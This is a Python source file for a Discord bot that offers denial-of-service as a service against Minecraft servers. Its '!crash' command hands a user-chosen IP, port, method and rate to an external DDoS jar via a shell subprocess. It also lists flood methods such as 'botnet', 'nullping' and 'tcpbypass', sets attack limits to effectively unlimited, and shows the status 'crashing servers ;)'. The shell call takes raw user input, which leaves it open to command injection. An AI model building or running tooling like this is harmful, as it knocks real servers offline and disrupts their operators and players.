import discord
import subprocess
import os
import threading
import time
from dotenv import load_dotenv
import requests

load_dotenv('.env')
TOKEN = os.getenv("TOKEN")

intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

# Store user data for attack limits (max 2 attacks per user)
user_attack_data = {}

# Max attacks per user and max time per attack
MAX_ATTACKS = 9999999
MAX_ATTACK_TIME = 9999 * 60  

# Allowed Guild ID and Channel ID
ALLOWED_GUILD_ID = 1330148451530309692
ALLOWED_CHANNEL_ID = 1335304101319151667

# Server invite link
server_invite = 'https://discord.gg/vg6kdGVv'
def find_players(server_address):
    url = f"https://api.mcsrvstat.us/3/{server_address}"
    try:
        response = requests.get(url)
        data = response.json()
        if data.get("online"):
            player_names = [player['name'] for player in data['players']['list']]
            return player_names
        else:
            return []
    except Exception as e:
        print(f"Error fetching server data: {e}")
        return []
async def kick_all_players_from_server(server_address, channel):
    player_usernames = find_players(server_address)
    if player_usernames is None:
        embed = discord.Embed(
            title="Error",
            description=f"Could not retrieve player list from **{server_address}**.",
            color=discord.Color.red()
        )
        await channel.send(embed=embed)
        return
    if player_usernames:
        embed = discord.Embed(
            title="Kicking Players!",
            description=f"Kicking all players connected to **{server_address}**.",
            color=discord.Color.green()
        )
        await channel.send(embed=embed)
        for username in player_usernames:
            embed = discord.Embed(
                title="Kicking Player",
                description=f"Kicking player **{username}** from the server.",
                color=discord.Color.blue()
            )
            await channel.send(embed=embed)
            time.sleep(1) 

    else:
        embed = discord.Embed(
            title="No Players Connected",
            description=f"No players are currently connected to **{server_address}**. No players to kick.",
            color=discord.Color.orange()
        )
        await channel.send(embed=embed)
def crash_attack(ip_port, protocol, method, seconds, targetcps, crash_id, user_id):
    try:
        command = f"java -jar SyverisDDoS.jar {ip_port} {protocol} {method} {seconds} {targetcps}"
        print(f"[INFO] Running command: {command}")
        process = subprocess.Popen(command, shell=True)
        user_attack_data[user_id]['processes'][crash_id] = process
        start_time = time.time()
        while time.time() - start_time < seconds:
            if process.poll() is not None:
                break
            time.sleep(1)
        process.terminate()
        process.wait()
        del user_attack_data[user_id]['processes'][crash_id]

    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Failed to execute command: {e}")
    finally:
        if crash_id in user_attack_data[user_id]['processes']:
            del user_attack_data[user_id]['processes'][crash_id]
@client.event
async def on_ready():
    print(f'Logged in as {client.user}')
    with open('pfp.jpeg', 'rb') as f:
        await client.user.edit(avatar=f.read())
    
    await client.change_presence(status=discord.Status.dnd, activity=discord.Game(name="crashing servers ;)"))
@client.event
async def on_message(message):
    if message.author == client.user:
        return
    if message.guild is None or message.guild.id != ALLOWED_GUILD_ID:
        await message.channel.send(f"Please join the server using this link: {server_invite}")
        return
    if message.channel.id != ALLOWED_CHANNEL_ID:
        await message.channel.send(f"Please go to the correct channel: <#{ALLOWED_CHANNEL_ID}> to use the commands.")
        return
    if message.content.startswith('!help'):
        embed = discord.Embed(
            title="Available Commands",
            description="Here are the available commands you can use:",
            color=discord.Color.blue()
        )
        
        embed.add_field(
            name="!crash <IP:PORT> <PROTOCOL> <METHOD> <SECONDS> <TARGETCPS>",
            value="Start a crash attack with specified parameters. For more information, type `!crash`.",
            inline=False
        )
        embed.add_field(
            name="!kickall <IP:PORT>",
            value="Kick all players connected to the specified Minecraft server.",
            inline=False
        )
        await message.channel.send(embed=embed)
        return
    if message.content.startswith('!kickall'):
        args = message.content.split()
        if len(args) != 2:
            embed = discord.Embed(
                title="Invalid Command",
                description="Usage: `!kickall <IP:PORT>`\nExample: `!kickall 127.0.0.1:25565`",
                color=discord.Color.red()
            )
            await message.channel.send(embed=embed)
            return
        server_address = args[1]
        await message.channel.send(f"Kicking all players connected to {server_address}...")
        await kick_all_players_from_server(server_address, message.channel)
    if message.content.startswith('!crash'):
        args = message.content.split()
        if len(args) == 1:
            embed = discord.Embed(
                title="!crash Command Usage",
                description="Start a crash attack with specified parameters.",
                color=discord.Color.red()
            )
            
            embed.add_field(
                name="Usage:",
                value="`!crash <IP:PORT> <PROTOCOL> <METHOD> <SECONDS> <TARGETCPS>`",
                inline=False
            )
            embed.add_field(
                name="Arguments:",
                value="**<IP:PORT>** - Target server address and port (e.g., 127.0.0.1:25565)\n"
                      "**<PROTOCOL>** - Protocol version of the server (e.g., 340 for Minecraft)\n"
                      "**<METHOD>** - Attack method (choose from a list of available methods)\n"
                      "**<SECONDS>** - Duration of the attack in seconds (max: 300 seconds)\n"
                      "**<TARGETCPS>** - Max CPS (connections per second) (use -1 for no limit)",
                inline=False
            )
            embed.add_field(
                name="Allowed Methods:",
                value="join, legitjoin, localhost, invalidnames, longnames, botjoiner, power, spoof, ping, spam, killer, nullping, ..."
                      "\nFor full list, check documentation.",
                inline=False
            )
            embed.add_field(
                name="Example:",
                value="`!crash 127.0.0.1:25565 340 join 60 1000`",
                inline=False
            )
            await message.channel.send(embed=embed)
            return
        if len(args) != 6:
            embed = discord.Embed(
                title="Invalid Command",
                description="Usage: `!crash <IP:PORT> <PROTOCOL> <METHOD> <SECONDS> <TARGETCPS>`",
                color=discord.Color.red()
            )  
            await message.channel.send(embed=embed)
            return
        ip_port = args[1]
        protocol = args[2]
        method = args[3]
        seconds = int(args[4])
        targetcps = args[5]
        allowed_methods = [
            'join', 'legitjoin', 'localhost', 'invalidnames', 'longnames', 'botjoiner', 'power', 'spoof', 'ping', 
            'spam', 'killer', 'nullping', 'charonbot', 'multikiller', 'packet', 'handshake', 'bighandshake', 
            'query', 'bigpacket', 'network', 'randombytes', 'spamjoin', 'nettydowner', 'ram', 'yoonikscry', 
            'colorcrasher', 'tcphit', 'queue', 'botnet', 'tcpbypass', 'ultimatesmasher', 'sf', 'nabcry'
        ]
        if method not in allowed_methods:
            await message.channel.send(f"[ERROR] Invalid method. Allowed methods: {', '.join(allowed_methods)}")
            return
        user_id = str(message.author.id)
        if user_id not in user_attack_data:
            user_attack_data[user_id] = {'attack_count': 0, 'processes': {}}
        if user_attack_data[user_id]['attack_count'] >= MAX_ATTACKS:
            await message.channel.send(f"[ERROR] You have already reached the maximum number of attacks ({MAX_ATTACKS})!")
            return
        crash_id = len(user_attack_data[user_id]['processes']) + 1
        user_attack_data[user_id]['attack_count'] += 1
        threading.Thread(target=crash_attack, args=(ip_port, protocol, method, seconds, targetcps, crash_id, user_id)).start()
        embed = discord.Embed(
            title=f"Starting Crash Attack on {ip_port}",
            description=f"Method: {method}\nDuration: {seconds} seconds\nTarget CPS: {targetcps}",
            color=discord.Color.green()
        )
        embed.set_footer(text="Credits to orkkz! For more information and updates, visit the GitHub repo.")
        embed.add_field(
            name="GitHub:",
            value="https://github.com/orkkz",
            inline=False
        )
        await message.channel.send(embed=embed)

# Run the bot
if __name__ == '__main__':
    client.run(TOKEN)
